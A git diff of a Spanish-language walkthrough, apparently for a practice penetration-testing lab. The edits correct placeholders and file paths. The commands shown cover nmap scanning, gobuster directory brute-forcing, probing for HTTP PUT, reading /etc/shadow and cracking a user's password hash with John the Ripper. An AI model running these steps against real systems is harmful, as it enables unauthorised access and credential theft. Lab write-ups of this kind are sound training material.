@@ -59,7 +59,7 @@ Copia la IP obtenida e introdúcela donde veas VICTIM_IP.
 Ejecutamos `nmap` contra la IP objetivo para descubrir puertos abiertos y versiones de servicios.
 
 ```bash
-nmap -p- -sV -sC VICTIM_ID
+nmap -p- -sV -sC VICTIM_IP
 ```
 **Resultados del análisis:**
 - Se detecta un servicio **HTTP (Puerto 80)**.
@@ -69,14 +69,14 @@ nmap -p- -sV -sC VICTIM_ID
 Utilizamos herramientas de fuerza bruta de directorios desde la máquina atacante para descubrir rutas ocultas en el servidor web.
 
 ```bash
-gobuster dir -u http://VICTIM_ID -w common.txt
+gobuster dir -u http://VICTIM_IP -w /common.txt
 ```
 
 Se identifica que el directorio `/test/` es accesible y potencialmente vulnerable.
 
 ### 3. Para comprobar si el servidor permite el método HTTP **PUT**, lo cual supondría una mala configuración de seguridad ejecutamos el siguiente comando:
 ```bash
-curl -v -X OPTIONS http://VICTIM_ID/test/
+curl -v -X OPTIONS http://VICTIM_IP/test/
 ```
 **Conclusión:** La configuración del servidor responde explícitamente permitiendo el método **PUT**. Esto representa una vulnerabilidad crítica que permite la subida arbitraria de archivos al servidor sin autenticación.
 
@@ -144,16 +144,16 @@ ls -l /etc/shadow
 grep user1 /etc/shadow
 ```
 
-Copiamos la línea entera y la guardamos en nuestra máquina local como hash.txt.
+Copiamos la línea entera y la guardamos en nuestra máquina atacante como hash.txt.
 ```bash
 echo 'LINEA_COPIADA' > hash.txt
 ```
 
-4. Cracking Offline (John the Ripper): Necesitarás tener descargado rockyou.txt.
+4. Cracking Offline (John the Ripper):
 Nota:Puedes usar tu crackeador favorito
 
 ```bash
-john --wordlist=rockyou.txt hash.txt
+john --wordlist=/rockyou.txt hash.txt
 ```
 
 Resultado: Contraseña encontrada -> rockyou
